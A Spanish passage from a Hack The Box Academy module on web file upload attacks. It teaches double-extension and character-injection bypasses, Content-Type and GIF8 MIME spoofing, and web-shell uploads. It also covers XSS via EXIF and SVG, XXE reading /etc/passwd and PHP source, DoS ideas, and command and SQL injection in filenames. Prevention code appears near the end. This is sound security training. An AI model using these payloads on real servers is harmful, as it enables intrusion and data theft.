Vemos que recibimos un mensaje diciendo `Only images are allowed`, que puede ser más común en las aplicaciones web que ver un tipo de extensión bloqueada. Sin embargo, los mensajes de error no siempre reflejan qué forma de validación se está utilizando, así que intentemos fuzz para las extensiones permitidas como lo hicimos en la sección anterior, utilizando la misma lista de palabras que usamos anteriormente:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_whitelist_fuzz.jpg)

Podemos ver que todas las variaciones de las extensiones de PHP están bloqueadas (por ejemplo. `php5`, `php7`, `phtml`). Sin embargo, la lista de palabras que utilizamos también contenía otras extensiones 'maliciosas' que no fueron bloqueadas y se cargaron con éxito. Por lo tanto, tratemos de entender cómo pudimos cargar estas extensiones y en qué casos podemos utilizarlas para ejecutar código PHP en el servidor de back-end.

El siguiente es un ejemplo de una prueba de lista blanca de extensión de archivo:

Código: php

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

Vemos que el guión utiliza una Expresión Regular (`regex`) para probar si el nombre de archivo contiene alguna extensión de imagen de la lista blanca. El problema aquí radica dentro del `regex`, ya que solo comprueba si el nombre del archivo `contains` la extensión y no si realmente `ends` con eso. Muchos desarrolladores cometen tales errores debido a una comprensión débil de los patrones regex.

Entonces, veamos cómo podemos evitar estas pruebas para cargar scripts PHP.

---

## Extensiones Dobles

El código solo prueba si el nombre del archivo contiene una extensión de imagen; un método sencillo de pasar la prueba regex es a través de `Double Extensions`. Por ejemplo, si el `.jpg` se permitió la extensión, podemos agregarla en nuestro nombre de archivo cargado y aún así finalizar nuestro nombre de archivo con `.php` (p. ej. `shell.jpg.php`), en cuyo caso deberíamos poder pasar la prueba de la lista blanca, mientras seguimos cargando un script PHP que puede ejecutar código PHP.

**Ejercicio:** Intenta borrar el formulario de carga con [Esta Lista de Palabras](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) para encontrar qué extensiones están en la lista blanca por el formulario de carga.

Interceptemos una solicitud de carga normal y modifiquemos el nombre del archivo a (`shell.jpg.php`), y modificar su contenido al de un shell web:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_double_ext_request.jpg)

Ahora, si visitamos el archivo cargado e intentamos enviar un comando, podemos ver que efectivamente ejecuta con éxito los comandos del sistema, lo que significa que el archivo que cargamos es un script PHP que funciona completamente:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_php_manual_shell.jpg)

Sin embargo, esto puede no funcionar siempre, ya que algunas aplicaciones web pueden usar un estricto `regex` patrón, como se mencionó anteriormente, como el siguiente:

Código: php

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```

Este patrón solo debe considerar la extensión de archivo final, como se usa (`^.*\.`) para hacer coincidir todo hasta el final (`.`), y luego usa (`$`) al final para que solo coincida con las extensiones que finalizan el nombre del archivo. Entonces, el `above attack would not work`. Sin embargo, algunas técnicas de explotación pueden permitirnos eludir este patrón, pero la mayoría depende de configuraciones erróneas o sistemas obsoletos.

---

## Reverso Doble Extensión

En algunos casos, la funcionalidad de carga de archivos en sí puede no ser vulnerable, pero la configuración del servidor web puede conducir a una vulnerabilidad. Por ejemplo, una organización puede usar una aplicación web de código abierto, que tiene una funcionalidad de carga de archivos. Incluso si la funcionalidad de carga de archivos utiliza un patrón regex estricto que solo coincide con la extensión final en el nombre del archivo, la organización puede usar las configuraciones inseguras para el servidor web.

Por ejemplo, el `/etc/apache2/mods-enabled/php7.4.conf` para el `Apache2` el servidor web puede incluir la siguiente configuración:

Código: xml

```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

La configuración anterior es cómo el servidor web determina qué archivos permiten la ejecución de código PHP. Especifica una lista blanca con un patrón regex que coincide `.phar`, `.php`, y `.phtml`. Sin embargo, este patrón regex puede tener el mismo error que vimos antes si nos olvidamos de terminarlo con (`$`). En tales casos, cualquier archivo que contenga las extensiones anteriores se permitirá la ejecución de código PHP, incluso si no termina con la extensión PHP. Por ejemplo, el nombre del archivo (`shell.php.jpg`) debe pasar la prueba de lista blanca anterior ya que termina con (`.jpg`), y sería capaz de ejecutar código PHP debido a la mala configuración anterior, como contiene (`.php`) en su nombre.

**Ejercicio:** La aplicación web todavía puede utilizar una lista negra para denegar las solicitudes que contienen `PHP` extensiones. Intenta borrar el formulario de carga con el [Lista de palabras PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) para encontrar qué extensiones están en la lista negra del formulario de carga.

Intentemos interceptar una solicitud de carga de imagen normal y usemos el nombre de archivo anterior para pasar la estricta prueba de lista blanca:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_reverse_double_ext_request.jpg)

Ahora, podemos visitar el archivo cargado e intentar ejecutar un comando:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_php_manual_shell.jpg)

Como podemos ver, omitimos con éxito la estricta prueba de lista blanca y explotamos la configuración incorrecta del servidor web para ejecutar código PHP y obtener control sobre el servidor.

## Inyección de Carácter

Finalmente, discutamos otro método para evitar una prueba de validación de lista blanca `Character Injection`. Podemos inyectar varios caracteres antes o después de la extensión final para hacer que la aplicación web malinterprete el nombre de archivo y ejecute el archivo cargado como un script PHP.

Los siguientes son algunos de los caracteres que podemos intentar inyectar:

- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`

Cada carácter tiene un caso de uso específico que puede engañar a la aplicación web para malinterpretar la extensión de archivo. Por ejemplo, (`shell.php%00.jpg`) funciona con servidores PHP con versión `5.X` o antes, ya que hace que el servidor web PHP termine el nombre del archivo después del (`%00`), y almacenarlo como (`shell.php`), mientras sigue pasando la lista blanca. Lo mismo se puede usar con aplicaciones web alojadas en un servidor Windows inyectando dos puntos (`:`) antes de la extensión de archivo permitida (por ejemplo. `shell.aspx:.jpg`), que también debe escribir el archivo como (`shell.aspx`). Del mismo modo, cada uno de los otros caracteres tiene un caso de uso que puede permitirnos cargar un script PHP sin pasar por la prueba de validación de tipos.

Podemos escribir un pequeño script bash que genere todas las permutaciones del nombre del archivo, donde se inyectarían los caracteres anteriores antes y después de ambos `PHP` y `JPG` extensiones, de la siguiente manera:

Código: bash

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

Con esta lista de palabras personalizada, podemos ejecutar un escaneo fuzzing con `Burp Intruder`, similar a los que hicimos antes. Si el back-end o el servidor web están desactualizados o tienen ciertas configuraciones erróneas, algunos de los nombres de archivo generados pueden omitir la prueba de lista blanca y ejecutar código PHP.

**Ejercicio:** Intente agregar más extensiones de PHP al script anterior para generar más permutaciones de nombre de archivo, luego borre la funcionalidad de carga con la lista de palabras generada para ver cuál de los nombres de archivo generados se puede cargar y cuál puede ejecutar código PHP después de cargarse.


# Tipo Filtros

---

Hasta ahora, solo hemos estado tratando con filtros de tipo que solo consideran la extensión de archivo en el nombre del archivo. Sin embargo, como vimos en la sección anterior, es posible que aún podamos obtener control sobre el servidor de back-end incluso con extensiones de imagen (por ejemplo. `shell.php.jpg`). Además, podemos utilizar algunas extensiones permitidas (por ejemplo, SVG) para realizar otros ataques. Todo esto indica que solo probar la extensión de archivo no es suficiente para evitar ataques de carga de archivos.

Esta es la razón por la cual muchos servidores web y aplicaciones web modernas también prueban el contenido del archivo cargado para asegurarse de que coincida con el tipo especificado. Si bien los filtros de extensión pueden aceptar varias extensiones, los filtros de contenido generalmente especifican una sola categoría (por ejemplo, imágenes, videos, documentos), por lo que generalmente no usan listas negras o listas blancas. Esto se debe a que los servidores web proporcionan funciones para verificar el tipo de contenido del archivo, y generalmente cae en una categoría específica.

Hay dos métodos comunes para validar el contenido del archivo: `Content-Type Header` o `File Content`. Veamos cómo podemos identificar cada filtro y cómo evitar ambos.

---

## Tipo de Contenido

Comencemos el ejercicio al final de esta sección e intentemos cargar un script PHP:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_content_type_upload.jpg)

Vemos que recibimos un mensaje diciendo `Only images are allowed`. El mensaje de error persiste y nuestro archivo no se carga incluso si probamos algunos de los trucos que aprendimos en las secciones anteriores. Si cambiamos el nombre del archivo a `shell.jpg.phtml` o `shell.php.jpg`, o incluso si usamos `shell.jpg` con un contenido de shell web, nuestra carga fallará. Como la extensión de archivo no afecta el mensaje de error, la aplicación web debe probar el contenido del archivo para la validación del tipo. Como se mencionó anteriormente, esto puede estar en el `Content-Type Header` o el `File Content`.

El siguiente es un ejemplo de cómo una aplicación web PHP prueba el encabezado Content-Type para validar el tipo de archivo:

Código: php

```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

El código establece el (`$type`) variable de los archivos cargados `Content-Type` encabezado. Nuestros navegadores configuran automáticamente el encabezado Content-Type al seleccionar un archivo a través del cuadro de diálogo del selector de archivos, generalmente derivado de la extensión de archivo. Sin embargo, dado que nuestros navegadores configuran esto, esta operación es una operación del lado del cliente, y podemos manipularla para cambiar el tipo de archivo percibido y potencialmente omitir el filtro de tipo.

Podemos comenzar borrando el encabezado Content-Type con SecLists [Lista de palabras de Tipo de Contenido](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) a través de Burp Intruder, para ver qué tipos están permitidos. Sin embargo, el mensaje nos dice que solo se permiten imágenes, por lo que podemos limitar nuestro escaneo a tipos de imágenes, lo que reduce la lista de palabras a `45` solo tipos (en comparación con alrededor de 700 originalmente). Podemos hacerlo de la siguiente manera:

  Tipo Filtros

```shell-session
vcrdcr@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
vcrdcr@htb[/htb]$ cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```

**Ejercicio:** Intente ejecutar el escaneo anterior para encontrar qué tipos de contenido están permitidos.

En aras de la simplicidad, escojamos un tipo de imagen (por ejemplo. `image/jpg`), luego intercepte nuestra solicitud de carga y cambie el encabezado Content-Type a él:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_bypass_content_type_request.jpg)

Esta vez tenemos `File successfully uploaded`, y si visitamos nuestro archivo, vemos que se cargó correctamente:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_php_manual_shell.jpg)

**Nota:** Una solicitud HTTP de carga de archivos tiene dos encabezados Content-Type, uno para el archivo adjunto (en la parte inferior) y otro para la solicitud completa (en la parte superior). Por lo general, necesitamos modificar el encabezado Content-Type del archivo, pero en algunos casos la solicitud solo contendrá el encabezado Content-Type principal (por ejemplo, si el contenido cargado se envió como `POST` datos), en cuyo caso necesitaremos modificar el encabezado principal Content-Type.

---

## Tipo MIME

El segundo y más común tipo de validación de contenido de archivo es probar el archivo cargado `MIME-Type`. `Multipurpose Internet Mail Extensions (MIME)` es un estándar de Internet que determina el tipo de archivo a través de su formato general y estructura de bytes.

Esto generalmente se hace inspeccionando los primeros bytes del contenido del archivo, que contienen el [Firma de Archivo](https://en.wikipedia.org/wiki/List_of_file_signatures) o [Bytes Mágicos](https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime). Por ejemplo, si un archivo comienza con (`GIF87a` o `GIF89a`), esto indica que es un `GIF` imagen, mientras que un archivo que comienza con texto sin formato generalmente se considera un `Text` archivo. Si cambiamos los primeros bytes de cualquier archivo a los bytes mágicos GIF, su tipo MIME se cambiaría a una imagen GIF, independientemente de su contenido o extensión restante.

**Consejo:** Muchos otros tipos de imágenes tienen bytes no imprimibles para sus firmas de archivos, mientras que un `GIF` la imagen comienza con bytes imprimibles ASCII (como se muestra arriba), por lo que es la más fácil de imitar. Además, como la cuerda `GIF8` es común entre ambas firmas GIF, generalmente es suficiente imitar una imagen GIF.

Tomemos un ejemplo básico para demostrar esto. El `file` el comando en sistemas Unix encuentra el tipo de archivo a través del tipo MIME. Si creamos un archivo básico con texto en él, se consideraría como un archivo de texto, de la siguiente manera:

  Tipo Filtros

```shell-session
vcrdcr@htb[/htb]$ echo "this is a text file" > text.jpg 
vcrdcr@htb[/htb]$ file text.jpg 
text.jpg: ASCII text
```

Como vemos, el tipo MIME del archivo es `ASCII text`, aunque su extensión es `.jpg`. Sin embargo, si escribimos `GIF8` al comienzo del archivo, se considerará como un `GIF` imagen en cambio, a pesar de que su extensión está quieta `.jpg`:

  Tipo Filtros

```shell-session
vcrdcr@htb[/htb]$ echo "GIF8" > text.jpg 
vcrdcr@htb[/htb]$file text.jpg
text.jpg: GIF image data
```

Los servidores web también pueden utilizar este estándar para determinar los tipos de archivos, que generalmente es más preciso que probar la extensión de archivo. El siguiente ejemplo muestra cómo una aplicación web PHP puede probar el tipo MIME de un archivo cargado:

Código: php

```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

Como podemos ver, los tipos MIME son similares a los que se encuentran en los encabezados Content-Type, pero su fuente es diferente, ya que PHP usa el `mime_content_type()` función para obtener el tipo MIME de un archivo. Intentemos repetir nuestro último ataque, pero ahora con un ejercicio que prueba tanto el encabezado Content-Type como el tipo MIME:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_bypass_content_type_request.jpg)

Una vez que reenviamos nuestra solicitud, notamos que recibimos el mensaje de error `Only images are allowed`. Ahora, intentemos agregar `GIF8` antes de nuestro código PHP para tratar de imitar una imagen GIF mientras mantenemos nuestra extensión de archivo como `.php`, por lo que ejecutaría código PHP independientemente:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_bypass_mime_type_request.jpg)

Esta vez tenemos `File successfully uploaded`y nuestro archivo se carga correctamente en el servidor:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_bypass_mime_type.jpg)

Ahora podemos visitar nuestro archivo cargado, y veremos que podemos ejecutar con éxito los comandos del sistema:

   

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_php_manual_shell_gif.jpg)

**Nota:** Vemos que la salida del comando comienza con `GIF8` , ya que esta fue la primera línea en nuestro script PHP para imitar los bytes mágicos GIF, y ahora se emite como un texto sin formato antes de que se ejecute nuestro código PHP.

Podemos usar una combinación de los dos métodos discutidos en esta sección, lo que puede ayudarnos a evitar algunos filtros de contenido más robustos. Por ejemplo, podemos intentar usar un `Allowed MIME type with a disallowed Content-Type`, un `Allowed MIME/Content-Type with a disallowed extension`, o a `Disallowed MIME/Content-Type with an allowed extension`y así sucesivamente. Del mismo modo, podemos intentar otras combinaciones y permutaciones para tratar de confundir el servidor web, y dependiendo del nivel de seguridad del código, podemos evitar varios filtros.


# Cargas Limitadas de Archivos

---

Hasta ahora, hemos estado tratando principalmente con omisiones de filtros para obtener cargas arbitrarias de archivos a través de una aplicación web vulnerable, que es el enfoque principal de este módulo en este nivel. Si bien los formularios de carga de archivos con filtros débiles pueden explotarse para cargar archivos arbitrarios, algunos formularios de carga tienen filtros seguros que pueden no ser explotables con las técnicas que discutimos. Sin embargo, incluso si estamos tratando con un formulario de carga de archivos limitado (es decir, no arbitrario), que solo nos permite cargar tipos de archivos específicos, es posible que podamos realizar algunos ataques a la aplicación web.

Ciertos tipos de archivos, como `SVG`, `HTML`, `XML`, e incluso algunos archivos de imágenes y documentos, pueden permitirnos introducir nuevas vulnerabilidades a la aplicación web mediante la carga de versiones maliciosas de estos archivos. Esta es la razón por la cual fuzzing extensiones de archivo permitidas es un ejercicio importante para cualquier ataque de carga de archivos. Nos permite explorar qué ataques pueden ser alcanzables en el servidor web. Entonces, exploremos algunos de estos ataques.

---

## XSS

Muchos tipos de archivos pueden permitirnos introducir un `Stored XSS` vulnerabilidad a la aplicación web al cargar versiones maliciosamente diseñadas de ellos.

El ejemplo más básico es cuando una aplicación web nos permite subir `HTML` archivos. Aunque los archivos HTML no nos permitirán ejecutar código (por ejemplo, PHP), aún sería posible implementar código JavaScript dentro de ellos para llevar un ataque XSS o CSRF a quien visite la página HTML cargada. Si el objetivo ve un enlace desde un sitio web en el que confían, y el sitio web es vulnerable a cargar documentos HTML, es posible engañarlos para que visiten el enlace y lleven el ataque a sus máquinas.

Otro ejemplo de ataques XSS son las aplicaciones web que muestran los metadatos de una imagen después de su carga. Para tales aplicaciones web, podemos incluir una carga útil XSS en uno de los parámetros de metadatos que aceptan texto sin procesar, como el `Comment` o `Artist` parámetros, como sigue:

  Cargas Limitadas de Archivos

```shell-session
vcrdcr@htb[/htb]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
vcrdcr@htb[/htb]$ exiftool HTB.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```

Podemos ver que el `Comment` el parámetro se actualizó a nuestra carga útil XSS. Cuando se muestran los metadatos de la imagen, se debe activar la carga útil XSS y se ejecutará el código JavaScript para llevar el ataque XSS. Además, si cambiamos el tipo MIME de la imagen a `text/html`, algunas aplicaciones web pueden mostrarlo como un documento HTML en lugar de una imagen, en cuyo caso la carga útil XSS se activaría incluso si los metadatos no se mostraran directamente.

Finalmente, los ataques XSS también se pueden llevar a cabo con `SVG` imágenes, junto con varios otros ataques. `Scalable Vector Graphics (SVG)` las imágenes están basadas en XML y describen gráficos vectoriales 2D, que el navegador representa en una imagen. Por esta razón, podemos modificar sus datos XML para incluir una carga útil XSS. Por ejemplo, podemos escribir lo siguiente a `HTB.svg`:

Código: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

Una vez que carguemos la imagen en la aplicación web, la carga útil XSS se activará cada vez que se muestre la imagen.

Para obtener más información sobre XSS, puede consultar el [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/module/details/103) módulo.

**Ejercicio:** Pruebe los ataques anteriores con el ejercicio al final de esta sección, y vea si la carga útil XSS se activa y muestra la alerta.

---

## XXE

Se pueden llevar a cabo ataques similares para conducir a la explotación de XXE. Con las imágenes SVG, también podemos incluir datos XML maliciosos para filtrar el código fuente de la aplicación web y otros documentos internos dentro del servidor. El siguiente ejemplo se puede utilizar para una imagen SVG que filtra el contenido de (`/etc/passwd`):

Código: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Una vez que se carga y se ve la imagen SVG anterior, el documento XML se procesará y deberíamos obtener la información de (`/etc/passwd`) impreso en la página o mostrado en la fuente de la página. Del mismo modo, si la aplicación web permite la carga de `XML` documentos, entonces la misma carga útil puede llevar el mismo ataque cuando los datos XML se muestran en la aplicación web.

Mientras lee archivos de sistemas como `/etc/passwd` puede ser muy útil para la enumeración de servidores, puede tener un beneficio aún más significativo para las pruebas de penetración web, ya que nos permite leer los archivos fuente de la aplicación web. El acceso al código fuente nos permitirá encontrar más vulnerabilidades para explotar dentro de la aplicación web a través de Whitebox Penetration Testing. Para la explotación de File Upload, puede permitirnos `locate the upload directory, identify allowed extensions, or find the file naming scheme`, que puede ser útil para una mayor explotación.

Para usar XXE para leer código fuente en aplicaciones web PHP, podemos usar la siguiente carga útil en nuestra imagen SVG:

Código: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Una vez que se muestra la imagen SVG, debemos obtener el contenido codificado base64 de `index.php`, que podemos decodificar para leer el código fuente. Para obtener más información sobre XXE, puede consultar el [Ataques Web](https://academy.hackthebox.com/module/details/134) módulo.

El uso de datos XML no es exclusivo de las imágenes SVG, ya que también es utilizado por muchos tipos de documentos, como `PDF`, `Word Documents`, `PowerPoint Documents`, entre muchos otros. Todos estos documentos incluyen datos XML dentro de ellos para especificar su formato y estructura. Supongamos que una aplicación web utiliza un visor de documentos que es vulnerable a XXE y permite cargar cualquiera de estos documentos. En ese caso, también podemos modificar sus datos XML para incluir los elementos XXE maliciosos, y podríamos llevar un ataque XXE ciego en el servidor web de back-end.

Otro ataque similar que también se puede lograr a través de estos tipos de archivos es un ataque SSRF. Podemos utilizar la vulnerabilidad XXE para enumerar los servicios disponibles internamente o incluso llamar a API privadas para realizar acciones privadas. Para obtener más información sobre SSRF, puede consultar el [Ataques del lado del servidor](https://academy.hackthebox.com/module/details/145) módulo.

---

## DoS

Finalmente, muchas vulnerabilidades de carga de archivos pueden conducir a un `Denial of Service (DOS)` ataque al servidor web. Por ejemplo, podemos usar las cargas útiles XXE anteriores para lograr ataques DoS, como se discutió en el [Ataques Web](https://academy.hackthebox.com/module/details/134) módulo.

Además, podemos utilizar un `Decompression Bomb` con tipos de archivos que usan compresión de datos, como `ZIP` archivos. Si una aplicación web descomprime automáticamente un archivo ZIP, es posible cargar un archivo malicioso que contenga archivos ZIP anidados dentro de él, lo que eventualmente puede llevar a muchos Petabytes de datos, lo que resulta en un bloqueo en el servidor de back-end.

Otro posible ataque DoS es un `Pixel Flood` ataque con algunos archivos de imagen que utilizan compresión de imagen, como `JPG` o `PNG`. Podemos crear cualquiera `JPG` archivo de imagen con cualquier tamaño de imagen (por ejemplo. `500x500`), y luego modificar manualmente sus datos de compresión para decir que tiene un tamaño de (`0xffff x 0xffff`), lo que da como resultado una imagen con un tamaño percibido de 4 Gigapíxeles. Cuando la aplicación web intenta mostrar la imagen, intentará asignar toda su memoria a esta imagen, lo que provocará un bloqueo en el servidor de back-end.

Además de estos ataques, podemos probar algunos otros métodos para causar un DoS en el servidor de back-end. Una forma es cargar un archivo demasiado grande, ya que algunos formularios de carga pueden no limitar el tamaño del archivo de carga o verificarlo antes de cargarlo, lo que puede llenar el disco duro del servidor y hacer que se bloquee o disminuya considerablemente.

Si la función de carga es vulnerable al salto de directorio, también podemos intentar cargar archivos en un directorio diferente (por ejemplo. `../../../etc/passwd`), que también puede causar que el servidor se bloquee. `Try to search for other examples of DOS attacks through a vulnerable file upload functionality`.


# Otros Ataques de Carga

---

Además de las cargas arbitrarias de archivos y los ataques limitados de carga de archivos, hay algunas otras técnicas y ataques que vale la pena mencionar, ya que pueden ser útiles en algunas pruebas de penetración web o pruebas de recompensas de errores. Discutamos algunas de estas técnicas y cuándo podemos usarlas.

---

## Inyecciones en Nombre de archivo

Un ataque común de carga de archivos utiliza una cadena maliciosa para el nombre del archivo cargado, que puede ejecutarse o procesarse si se muestra el nombre del archivo cargado (es decir, reflejado) en la página. Podemos intentar inyectar un comando en el nombre del archivo, y si la aplicación web utiliza el nombre del archivo dentro de un comando OS, puede conducir a un ataque de inyección de comandos.

Por ejemplo, si nombramos un archivo `file$(whoami).jpg` o ``file`whoami`.jpg`` o `file.jpg||whoami`, y luego la aplicación web intenta mover el archivo cargado con un comando OS (por ejemplo. `mv file /tmp`), entonces nuestro nombre de archivo inyectaría el `whoami` comando, que se ejecutaría, lo que llevaría a la ejecución remota de código. Puede referirse al [Inyecciones de Comando](https://academy.hackthebox.com/module/details/109) módulo para más información.

Del mismo modo, podemos usar una carga útil XSS en el nombre del archivo (por ejemplo. `<script>alert(window.origin);</script>`), que se ejecutaría en la máquina del destino si se les muestra el nombre del archivo. También podemos inyectar una consulta SQL en el nombre del archivo (por ejemplo. `file';select+sleep(5);--.jpg`), lo que puede conducir a una inyección SQL si el nombre del archivo se utiliza de forma insegura en una consulta SQL.

---

## Cargar Divulgación de Directorio

En algunos formularios de carga de archivos, como un formulario de comentarios o un formulario de envío, es posible que no tengamos acceso al enlace de nuestro archivo cargado y que no conozcamos el directorio de cargas. En tales casos, podemos utilizar fuzzing para buscar el directorio de cargas o incluso usar otras vulnerabilidades (por ejemplo, LFI/XXE) para encontrar dónde están los archivos cargados leyendo el código fuente de las aplicaciones web, como vimos en la sección anterior. Además, el [Ataques Web/IDOR](https://academy.hackthebox.com/module/details/134) el módulo analiza varios métodos para encontrar dónde se pueden almacenar los archivos e identificar el esquema de nombres de archivos.

Otro método que podemos utilizar para divulgar el directorio de cargas es forzar mensajes de error, ya que a menudo revelan información útil para una mayor explotación. Un ataque que podemos usar para causar tales errores es cargar un archivo con un nombre que ya existe o enviar dos solicitudes idénticas simultáneamente. Esto puede llevar al servidor web a mostrar un error que no pudo escribir el archivo, que puede revelar el directorio de cargas. También podemos intentar cargar un archivo con un nombre demasiado largo (por ejemplo, 5.000 caracteres). Si la aplicación web no maneja esto correctamente, también puede equivocarse y revelar el directorio de carga.

Del mismo modo, podemos probar varias otras técnicas para hacer que el servidor se equivoque y revele el directorio de cargas, junto con información útil adicional.

---

## Ataques específicos de Windows

También podemos usar algunos `Windows-Specific` técnicas en algunos de los ataques que discutimos en las secciones anteriores.

Uno de esos ataques es usar caracteres reservados, como (`|`, `<`, `>`, `*`, o `?`), que generalmente están reservados para usos especiales como comodines. Si la aplicación web no desinfecta adecuadamente estos nombres o los envuelve entre comillas, pueden referirse a otro archivo (que puede no existir) y causar un error que divulgue el directorio de carga. Del mismo modo, podemos usar nombres reservados de Windows para el nombre del archivo cargado, como (`CON`, `COM1`, `LPT1`, o `NUL`), lo que también puede causar un error ya que la aplicación web no podrá escribir un archivo con este nombre.

Finalmente, podemos utilizar Windows [8.3 Convención sobre el nombre de archivo](https://en.wikipedia.org/wiki/8.3_filename) para sobrescribir archivos existentes o consultar archivos que no existen. Las versiones anteriores de Windows se limitaban a una longitud corta para los nombres de archivo, por lo que usaban un carácter Tilde (`~`) para completar el nombre del archivo, que podemos utilizar para nuestra ventaja.

Por ejemplo, para referirse a un archivo llamado (`hackthebox.txt`) podemos usar (`HAC~1.TXT`) o (`HAC~2.TXT`), donde el dígito representa el orden de los archivos coincidentes que comienzan con (`HAC`). Como Windows todavía admite esta convención, podemos escribir un archivo llamado (por ejemplo. `WEB~.CONF`) para sobrescribir el `web.conf` archivo. Del mismo modo, podemos escribir un archivo que reemplaza los archivos sensibles del sistema. Este ataque puede conducir a varios resultados, como causar la divulgación de información a través de errores, causar un DoS en el servidor de back-end o incluso acceder a archivos privados.

---

## Ataques Avanzados de Carga de Archivos

Además de todos los ataques que hemos discutido en este módulo, hay ataques más avanzados que se pueden usar con funcionalidades de carga de archivos. Cualquier procesamiento automático que se produzca en un archivo cargado, como codificar un video, comprimir un archivo o cambiar el nombre de un archivo, puede explotarse si no se codifica de forma segura.

Algunas bibliotecas de uso común pueden tener exploits públicos para tales vulnerabilidades, como la vulnerabilidad de carga AVI que conduce a XXE en `ffmpeg`. Sin embargo, cuando se trata de código personalizado y bibliotecas personalizadas, la detección de tales vulnerabilidades requiere conocimientos y técnicas más avanzados, lo que puede llevar a descubrir una vulnerabilidad avanzada de carga de archivos en algunas aplicaciones web.

Hay muchas otras vulnerabilidades avanzadas de carga de archivos que no discutimos en este módulo. Intente leer algunos informes de recompensas de errores para explorar vulnerabilidades de carga de archivos más avanzadas.


# Prevención de Vulnerabilidades de Carga de Archivos

---

A lo largo de este módulo, hemos discutido varios métodos para explotar diferentes vulnerabilidades de carga de archivos. En cualquier prueba de penetración o ejercicio de recompensa de errores en el que participemos, debemos poder informar los puntos de acción que se deben tomar para rectificar las vulnerabilidades identificadas.

Esta sección discutirá qué podemos hacer para garantizar que nuestras funciones de carga de archivos estén codificadas de forma segura y seguras contra la explotación y qué puntos de acción podemos recomendar para cada tipo de vulnerabilidad de carga de archivos.

---

## Validación de Extensión

El primer y más común tipo de vulnerabilidades de carga que discutimos en este módulo fue la validación de la extensión de archivo. Las extensiones de archivo juegan un papel importante en la forma en que se ejecutan los archivos y scripts, ya que la mayoría de los servidores web y las aplicaciones web tienden a usar extensiones de archivo para establecer sus propiedades de ejecución. Es por eso que debemos asegurarnos de que nuestras funciones de carga de archivos puedan manejar de forma segura la validación de extensiones.

Si bien las extensiones de listas blancas siempre son más seguras, como hemos visto anteriormente, se recomienda usarlas tanto en la lista blanca de las extensiones permitidas como en la lista negra de extensiones peligrosas. De esta manera, la lista de listas negras evitará la carga de scripts maliciosos si la lista blanca se omite (por ejemplo. `shell.php.jpg`). El siguiente ejemplo muestra cómo se puede hacer esto con una aplicación web PHP, pero el mismo concepto se puede aplicar a otros frameworks:

Código: php

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

// blacklist test
if (preg_match('/^.+\.ph(p|ps|ar|tml)/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// whitelist test
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

Vemos que con la extensión en la lista negra, la aplicación web verifica `if the extension exists anywhere within the file name`, mientras que con las listas blancas, la aplicación web comprueba `if the file name ends with the extension`. Además, también debemos aplicar la validación de archivos de back-end y front-end. Incluso si la validación de front-end se puede omitir fácilmente, reduce las posibilidades de que los usuarios carguen archivos no deseados, lo que podría desencadenar un mecanismo de defensa y enviarnos una alerta falsa.

---

## Validación de Contenido

